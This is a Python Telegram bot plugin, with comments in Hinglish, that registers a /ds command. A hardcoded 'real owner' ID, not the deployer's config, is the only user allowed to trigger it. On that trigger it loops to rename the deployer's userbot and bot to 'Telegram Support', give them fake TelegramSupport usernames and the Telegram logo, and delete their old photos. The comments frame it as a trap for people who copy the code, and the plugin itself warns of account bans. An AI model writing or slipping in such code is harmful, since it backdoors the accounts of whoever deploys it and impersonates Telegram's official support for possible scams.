import asyncio
import random
import string
import aiohttp
import os
from pyrogram import Client
from pyrogram.errors import FloodWait, BadRequest

# PTB Imports
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, CommandHandler, CallbackQueryHandler

# ❌ Config Import Hata Diya (Taaki chor owner change na kar paye)
# from config import OWNER_ID

# 🔥 HARDCODED REAL OWNER ID (Sirf Tumhara Access Rahega) 🔥
REAL_OWNER_ID = 6356015122

# 🔥 IMPORT RUNNING ASSISTANT CLIENT 🔥
assistant_client = None
try:
    from tools.stream import app as assistant_client
except ImportError:
    try:
        from tools.stream import UB as assistant_client
    except:
        print("❌ Error: Assistant Client (app/UB) not found in tools/stream.py")

# --- SETTINGS ---
# Note: Name/Bio normal font mein hai taaki Real Telegram Support lage
DESTROY_NAME = "Telegram Support"
DESTROY_BIO = "+42777"
DESTROY_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/1024px-Telegram_logo.svg.png" 

# Global Flag
IS_DESTROYING = False

# --- HELPER: SMALL CAPS CONVERTER ---
def sm(text):
    mapping = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        '0': '₀', '1': '₁', '2': '₂', '3': '₃', '4': '₄', '5': '₅', '6': '₆', '7': '₇', '8': '₈', '9': '₉',
        ' ': ' '
    }
    return "".join(mapping.get(char.lower(), char) for char in text)

# --- HELPER: DOWNLOAD IMAGE ---
async def download_image(url, filename):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    with open(filename, "wb") as f:
                        f.write(data)
                    return filename
    except Exception as e:
        print(f"Image Download Error: {e}")
    return None

# --- HELPER: FAKE USERNAME GENERATOR ---
def generate_fake_username():
    # 'TelegramSupport' + Random Digits
    suffix = ''.join(random.choices(string.digits, k=5))
    return f"TelegramSupport{suffix}Bot"

# ==========================================
#      💀 ASSISTANT DESTRUCTION LOOP
# ==========================================
async def loop_destroy_assistant(chat_id, context):
    global IS_DESTROYING
    
    if not assistant_client:
        await context.bot.send_message(chat_id, sm("❌ Assistant Client Not Found!"))
        return

    # Download Telegram Logo
    photo_path = await download_image(DESTROY_IMG_URL, "tg_support.jpg")
    
    await context.bot.send_message(chat_id, sm("😈 **Assistant Loop Started!** (Impersonating Telegram Support...)"))

    while IS_DESTROYING:
        try:
            # 1. Force Name & Bio Update
            await assistant_client.update_profile(
                first_name=DESTROY_NAME,
                bio=DESTROY_BIO
            )

            # 2. Force Username Update
            try:
                new_user = generate_fake_username()
                await assistant_client.set_username(new_user)
            except:
                pass 

            # 3. Force PFP Update
            if photo_path:
                try:
                    # Delete old photos
                    async for photo in assistant_client.get_chat_photos("me", limit=1):
                        await assistant_client.delete_profile_photos(photo.file_id)
                    
                    # Set new photo
                    await assistant_client.set_profile_photo(photo=photo_path)
                except:
                    pass

            # ⏱️ 3 SECOND WAIT
            await asyncio.sleep(3)

        except FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception as e:
            print(f"Assistant Loop Error: {e}")
            await asyncio.sleep(3)

# ==========================================
#      💀 MAIN BOT DESTRUCTION LOOP
# ==========================================
async def loop_destroy_bot(chat_id, context):
    global IS_DESTROYING
    
    photo_path = await download_image(DESTROY_IMG_URL, "tg_support_bot.jpg")
    bot = context.bot
    
    await context.bot.send_message(chat_id, sm("😈 **Main Bot Loop Started!**"))

    while IS_DESTROYING:
        try:
            # 1. Force Bio/Description
            try:
                await bot.set_my_description(DESTROY_BIO)
                await bot.set_my_short_description(DESTROY_BIO)
                await bot.set_my_name(DESTROY_NAME)
            except:
                pass
            
            # 2. Force PFP
            if photo_path:
                try:
                    with open(photo_path, 'rb') as f:
                        await bot.set_chat_photo(chat_id=bot.id, photo=f)
                except:
                    pass 

            # ⏱️ 3 SECOND WAIT
            await asyncio.sleep(3)

        except Exception as e:
            print(f"Bot Loop Error: {e}")
            await asyncio.sleep(5)

# ==========================================
#      🎮 COMMANDS
# ==========================================

async def start_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global IS_DESTROYING
    user = update.effective_user
    
    # 🔥 TRAP LOGIC: Check against HARDCODED ID, not Config ID
    if user.id != REAL_OWNER_ID:
        return # Ignore everyone else (even if they change config.py)

    # Reset Flag
    IS_DESTROYING = False
    
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton(sm("🔥 BECOME TELEGRAM SUPPORT"), callback_data="start_chaos")],
        [InlineKeyboardButton(sm("🛑 STOP LOOP"), callback_data="stop_chaos")]
    ])
    
    msg_text = (
        "⚠️ **ɪᴍᴘᴇʀsᴏɴᴀᴛɪᴏɴ ᴍᴏᴅᴇ** ⚠️\n\n"
        "ᴛʜɪs ᴡɪʟʟ ᴄʜᴀɴɢᴇ ɴᴀᴍᴇ/ʙɪᴏ/ᴘꜰᴘ ᴛᴏ **ᴛᴇʟᴇɢʀᴀᴍ sᴜᴘᴘᴏʀᴛ**.\n"
        "**ɴᴏᴛᴇ:** ᴛʜɪs ʜᴀs ᴀ ᴠᴇʀʏ ʜɪɢʜ ʀɪsᴋ ᴏꜰ ᴀᴄᴄᴏᴜɴᴛ ʙᴀɴ.\n\n"
        "**ᴛᴀʀɢᴇᴛs:** ᴀssɪsᴛᴀɴᴛ & ᴍᴀɪɴ ʙᴏᴛ"
    )
    
    await update.message.reply_text(
        msg_text,
        reply_markup=buttons
    )

async def destroy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global IS_DESTROYING
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = update.effective_chat.id

    # 🔥 TRAP LOGIC: Check against HARDCODED ID
    if user_id != REAL_OWNER_ID:
        await query.answer(sm("Access Denied!"), show_alert=True)
        return

    if query.data == "start_chaos":
        if IS_DESTROYING:
            await query.answer(sm("Already Running!"), show_alert=True)
            return
            
        IS_DESTROYING = True
        
        msg_text = (
            "🔥 **ɪᴅᴇɴᴛɪᴛʏ ᴄʜᴀɴɢᴇᴅ!** 🔥\n\n"
            "ᴀssɪsᴛᴀɴᴛ ɪs ɴᴏᴡ 'ᴛᴇʟᴇɢʀᴀᴍ sᴜᴘᴘᴏʀᴛ'. ʟᴏᴏᴘ ɪs ᴀᴄᴛɪᴠᴇ."
        )
        await query.message.edit_text(msg_text)
        
        # Start Both Loops
        asyncio.create_task(loop_destroy_assistant(chat_id, context))
        asyncio.create_task(loop_destroy_bot(chat_id, context))

    elif query.data == "stop_chaos":
        IS_DESTROYING = False
        await query.message.edit_text(sm("✅ **LOOP STOPPED!**"))

# ==========================================
#      🔌 AUTO LOADER REGISTER
# ==========================================

def register_handlers(application):
    application.add_handler(CommandHandler("ds", start_destroy))
    application.add_handler(CallbackQueryHandler(destroy_callback, pattern="chaos"))
    
